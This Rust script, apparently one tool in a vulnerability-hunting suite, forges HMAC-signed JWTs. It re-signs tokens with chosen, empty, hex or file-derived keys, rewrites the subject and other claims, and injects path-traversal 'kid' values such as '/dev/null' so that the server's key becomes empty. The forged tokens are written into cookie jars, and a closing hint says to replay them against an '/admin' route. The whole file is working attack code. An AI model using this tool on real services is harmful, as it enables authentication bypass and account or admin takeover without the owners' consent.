#!/usr/bin/env rust-script
//! name: jwt_hs_forge
//! description: HMAC JWT 铸造件(密钥来自任意字节源)- 以字面密钥/空密钥/本地文件内容/hex 作为 HMAC 密钥,改 kid 与声明后重签 HS256/384/512;kid 可多条(每 kid 出一份 jar,专治服务端按 kid 取文件当密钥的路径遍历:kid=/dev/null 即空密钥),--decoded 回读头与载荷。合法授权测试用途。
//! version: 1.0.1
//! args: <token> [--key S | --key-empty | --key-file PATH | --key-hex HEX] [--kid K]... [--sub S] [--claim k=v]... [--alg HS256|HS384|HS512] [--exp N] [--host HOST] [--cookie session] [--jar FILE | --jars-dir DIR] [--out FILE] [--decoded] [--selftest]
//! keywords: 漏洞猎手套件, jwt, hs256, hmac, kid, 路径遍历, forge, cookie-jar
//!
//! ```cargo
//! [dependencies]
//! hmac = "0.12"
//! sha2 = "0.10"
//! base64 = "0.22"
//! ```

use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use hmac::{Hmac, Mac};
use pi_rust_lib::serde_json::{self, json, Map, Value};
use std::fs;
use std::path::Path;

fn b64(input: &str) -> Result<Map<String, Value>, String> {
    let raw = URL_SAFE_NO_PAD
        .decode(input)
        .map_err(|e| format!("base64url decode: {e}"))?;
    serde_json::from_slice(&raw).map_err(|e| format!("json parse: {e}"))
}

fn sign(alg: &str, key: &[u8], signing_input: &str) -> Result<String, String> {
    macro_rules! mac {
        ($ty:ty) => {{
            let mut m = <$ty>::new_from_slice(key).map_err(|e| format!("hmac key: {e}"))?;
            m.update(signing_input.as_bytes());
            Ok(URL_SAFE_NO_PAD.encode(m.finalize().into_bytes()))
        }};
    }
    match alg {
        "HS256" => mac!(Hmac<sha2::Sha256>),
        "HS384" => mac!(Hmac<sha2::Sha384>),
        "HS512" => mac!(Hmac<sha2::Sha512>),
        other => Err(format!("unsupported alg {other}")),
    }
}

fn parse_hex(s: &str) -> Result<Vec<u8>, String> {
    let clean: String = s.chars().filter(|c| !c.is_whitespace()).collect();
    if clean.len() % 2 != 0 {
        return Err("hex key must have an even number of digits".into());
    }
    (0..clean.len() / 2)
        .map(|i| u8::from_str_radix(&clean[i * 2..i * 2 + 2], 16).map_err(|e| e.to_string()))
        .collect()
}

struct Opts {
    token: String,
    key: Option<Vec<u8>>,
    key_src: String,
    kids: Vec<Option<String>>,
    sub: Option<String>,
    claims: Vec<(String, String)>,
    alg: String,
    exp: Option<i64>,
    host: Option<String>,
    cookie: String,
    jar: Option<String>,
    jars_dir: Option<String>,
    out: Option<String>,
    decoded: bool,
}

fn parse(args: &[String]) -> Result<Opts, String> {
    let mut o = Opts {
        token: String::new(),
        key: None,
        key_src: "none".into(),
        kids: Vec::new(),
        sub: None,
        claims: Vec::new(),
        alg: "HS256".into(),
        exp: None,
        host: None,
        cookie: "session".into(),
        jar: None,
        jars_dir: None,
        out: None,
        decoded: false,
    };
    let mut i = 0;
    while i < args.len() {
        let val = || args.get(i + 1).cloned().unwrap_or_default();
        match args[i].as_str() {
            "--key" => {
                o.key = Some(val().into_bytes());
                o.key_src = "literal".into();
                i += 2;
            }
            "--key-empty" => {
                o.key = Some(Vec::new());
                o.key_src = "empty".into();
                i += 1;
            }
            "--key-file" => {
                let p = val();
                o.key = Some(fs::read(&p).map_err(|e| format!("read {p}: {e}"))?);
                o.key_src = format!("file:{p}");
                i += 2;
            }
            "--key-hex" => {
                o.key = Some(parse_hex(&val())?);
                o.key_src = "hex".into();
                i += 2;
            }
            "--kid" => {
                o.kids.push(Some(val()));
                i += 2;
            }
            "--sub" => {
                o.sub = Some(val());
                i += 2;
            }
            "--claim" => {
                let kv = val();
                let (k, v) = kv
                    .split_once('=')
                    .ok_or_else(|| format!("--claim needs k=v, got {kv}"))?;
                o.claims.push((k.to_string(), v.to_string()));
                i += 2;
            }
            "--alg" => {
                o.alg = val();
                i += 2;
            }
            "--exp" => {
                o.exp = Some(val().parse().map_err(|_| "--exp needs a number".to_string())?);
                i += 2;
            }
            "--host" => {
                o.host = Some(val());
                i += 2;
            }
            "--cookie" => {
                o.cookie = val();
                i += 2;
            }
            "--jar" => {
                o.jar = Some(val());
                i += 2;
            }
            "--jars-dir" => {
                o.jars_dir = Some(val());
                i += 2;
            }
            "--out" => {
                o.out = Some(val());
                i += 2;
            }
            "--decoded" => {
                o.decoded = true;
                i += 1;
            }
            other if other.starts_with("--") => return Err(format!("unknown flag {other}")),
            other => {
                o.token = other.to_string();
                i += 1;
            }
        }
    }
    let parts: Vec<&str> = o.token.split('.').collect();
    if parts.len() < 3 {
        return Err("expected a 3-part JWT as the first argument".into());
    }
    if o.key.is_none() {
        return Err("no key: pass --key S | --key-empty | --key-file PATH | --key-hex HEX".into());
    }
    if o.kids.is_empty() {
        o.kids.push(None);
    }
    if o.jar.is_some() && o.jars_dir.is_some() {
        return Err("--jar and --jars-dir are mutually exclusive".into());
    }
    Ok(o)
}

fn jar_host(o: &Opts) -> Result<String, String> {
    o.host
        .clone()
        .ok_or_else(|| "--jar/--jars-dir needs --host HOST".to_string())
}

fn write_jar(path: &str, host: &str, cookie: &str, token: &str) -> Result<(), String> {
    let text = fs::read_to_string(path).unwrap_or_else(|_| "{}".to_string());
    let mut root: Map<String, Value> =
        serde_json::from_str(&text).unwrap_or_else(|_| Map::new());
    let entry = root
        .entry(host.to_string())
        .or_insert_with(|| Value::Object(Map::new()));
    if !entry.is_object() {
        *entry = Value::Object(Map::new());
    }
    entry
        .as_object_mut()
        .expect("object")
        .insert(cookie.to_string(), json!(token));
    fs::write(path, serde_json::to_vec(&Value::Object(root)).map_err(|e| e.to_string())?)
        .map_err(|e| format!("write {path}: {e}"))
}

fn cmd_forge(args: &[String]) -> Result<Value, String> {
    let o = parse(args)?;
    let parts: Vec<&str> = o.token.split('.').collect();
    let mut header = b64(parts[0])?;
    let mut payload = b64(parts[1])?;
    let original = json!({
        "header": Value::Object(header.clone()),
        "payload": Value::Object(payload.clone()),
        "signature": parts[2],
    });

    header.insert("alg".into(), json!(o.alg));
    if let Some(s) = &o.sub {
        payload.insert("sub".into(), json!(s));
    }
    for (k, v) in &o.claims {
        let parsed: Value = serde_json::from_str(v).unwrap_or_else(|_| json!(v));
        payload.insert(k.clone(), parsed);
    }
    if let Some(e) = o.exp {
        payload.insert("exp".into(), json!(e));
    }

    let key = o.key.clone().unwrap_or_default();
    let mut variants: Vec<Value> = Vec::new();
    let mut first_out: Option<String> = None;
    for (idx, kid) in o.kids.iter().enumerate() {
        let mut h = header.clone();
        match kid {
            Some(k) => {
                h.insert("kid".into(), json!(k));
            }
            None => {
                h.remove("kid");
            }
        }
        let h2 = URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&Value::Object(h.clone())).map_err(|e| e.to_string())?);
        let p2 = URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&Value::Object(payload.clone())).map_err(|e| e.to_string())?);
        let signing_input = format!("{h2}.{p2}");
        let sig = sign(&o.alg, &key, &signing_input)?;
        let token = format!("{signing_input}.{sig}");
        if idx == 0 {
            first_out = Some(token.clone());
        }
        let mut jar_written: Option<String> = None;
        if let Some(jar) = &o.jar {
            write_jar(jar, &jar_host(&o)?, &o.cookie, &token)?;
            jar_written = Some(jar.clone());
        }
        if let Some(dir) = &o.jars_dir {
            fs::create_dir_all(dir).map_err(|e| format!("mkdir {dir}: {e}"))?;
            let name = match kid {
                Some(k) => k.replace(['/', '\\'], "_").replace(':', "_"),
                None => "no-kid".to_string(),
            };
            let path = format!("{}/{}-{}.json", dir.trim_end_matches('/'), idx, name);
            write_jar(&path, &jar_host(&o)?, &o.cookie, &token)?;
            jar_written = Some(path);
        }
        variants.push(json!({
            "kid": kid,
            "token": token,
            "jar": jar_written,
        }));
    }
    if let Some(path) = &o.out {
        let val = first_out.clone().unwrap_or_default();
        fs::write(path, &val).map_err(|e| format!("write {path}: {e}"))?;
    }
    let decoded = if o.decoded {
        json!({
            "header": Value::Object(header.clone()),
            "payload": Value::Object(payload.clone()),
        })
    } else {
        Value::Null
    };
    Ok(json!({
        "token": first_out,
        "token_len": first_out.as_ref().map(|t| t.len()),
        "key_source": o.key_src,
        "key_len": key.len(),
        "alg": o.alg,
        "variants": variants,
        "decoded": decoded,
        "original": original,
        "out": o.out,
        "cookie": o.cookie,
        "host": o.host,
    }))
}

fn sig_ok(token: &str, key: &[u8], alg: &str) -> bool {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return false;
    }
    let si = format!("{}.{}", parts[0], parts[1]);
    match sign(alg, key, &si) {
        Ok(sig) => sig == parts[2],
        Err(_) => false,
    }
}

fn selftest() -> Result<Value, String> {
    let h = URL_SAFE_NO_PAD.encode(br#"{"alg":"HS256","typ":"JWT","kid":"abc"}"#);
    let p = URL_SAFE_NO_PAD.encode(br#"{"iss":"fixture-iss","sub":"fixture-user","exp":1}"#);
    let si = format!("{h}.{p}");
    let token = format!("{si}.{}", sign("HS256", b"synthetic-pass-7f3a", &si)?);
    let dir = "/tmp/jwt_hs_forge_selftest";
    let _ = fs::remove_dir_all(dir);
    let _ = fs::remove_file("/tmp/jwt_hs_forge_selftest.json");
    let f = "/tmp/jwt_hs_forge_key.bin";
    fs::write(f, b"synthetic-pass-7f3a").map_err(|e| e.to_string())?;
    let literal = cmd_forge(&[
        token.clone(),
        "--key".into(),
        "synthetic-pass-7f3a".into(),
        "--sub".into(),
        "fixture-user".into(),
        "--kid".into(),
        "/dev/null".into(),
    ])?;
    let empty = cmd_forge(&[
        token.clone(),
        "--key-empty".into(),
        "--sub".into(),
        "fixture-user".into(),
        "--kid".into(),
        "/dev/null".into(),
        "--host".into(),
        "lab.example".into(),
        "--jar".into(),
        "/tmp/jwt_hs_forge_selftest.json".into(),
    ])?;
    let from_file = cmd_forge(&[
        token.clone(),
        "--key-file".into(),
        f.into(),
        "--host".into(),
        "lab.example".into(),
        "--jars-dir".into(),
        dir.into(),
        "--kid".into(),
        "/dev/null".into(),
        "--kid".into(),
        "../../../../dev/null".into(),
    ])?;
    let empty_sig_ok = empty["variants"][0]["token"]
        .as_str()
        .map(|t| sig_ok(t, b"", "HS256") && !sig_ok(t, b"synthetic-pass-7f3a", "HS256") && !sig_ok(t, b"secret", "HS256"))
        .unwrap_or(false);
    let file_sig_ok = from_file["variants"][0]["token"]
        .as_str()
        .map(|t| sig_ok(t, b"synthetic-pass-7f3a", "HS256") && !sig_ok(t, b"", "HS256"))
        .unwrap_or(false);
    let literal_sig_ok = literal["variants"][0]["token"]
        .as_str()
        .map(|t| sig_ok(t, b"synthetic-pass-7f3a", "HS256"))
        .unwrap_or(false);
    let jars_ok = from_file["variants"]
        .as_array()
        .map(|v| v.iter().all(|x| Path::new(x["jar"].as_str().unwrap_or("")).exists()))
        .unwrap_or(false);
    let jar_ok = Path::new("/tmp/jwt_hs_forge_selftest.json").exists();
    Ok(json!({
        "ok": literal_sig_ok && empty_sig_ok && file_sig_ok && jars_ok && jar_ok,
        "empty_key_matches": empty_sig_ok,
        "literal_key_matches": literal_sig_ok,
        "file_key_matches": file_sig_ok,
        "jars_written": jars_ok && jar_ok,
        "literal_variant": literal["variants"][0]["token"],
    }))
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.is_empty() {
        pi_rust_lib::report::failure(
            "jwt_hs_forge",
            "no arguments",
            "jwt_hs_forge <token> --key-empty|--key S|--key-file PATH [--kid K]...",
        );
        std::process::exit(2);
    }
    let result = if args[0] == "selftest" {
        selftest()
    } else {
        cmd_forge(&args)
    };
    match result {
        Ok(data) => {
            pi_rust_lib::report::success(
                "jwt_hs_forge",
                data,
                "http_session get <base>/admin --jar <jar> -> replay the jar against the protected route and read the verdict",
            )
            .expect("report");
        }
        Err(e) => {
            pi_rust_lib::report::failure(
                "jwt_hs_forge",
                &e,
                "jwt_hs_forge <token> --key-empty --kid /dev/null --sub user --host H --jar J",
            );
            std::process::exit(1);
        }
    }
}
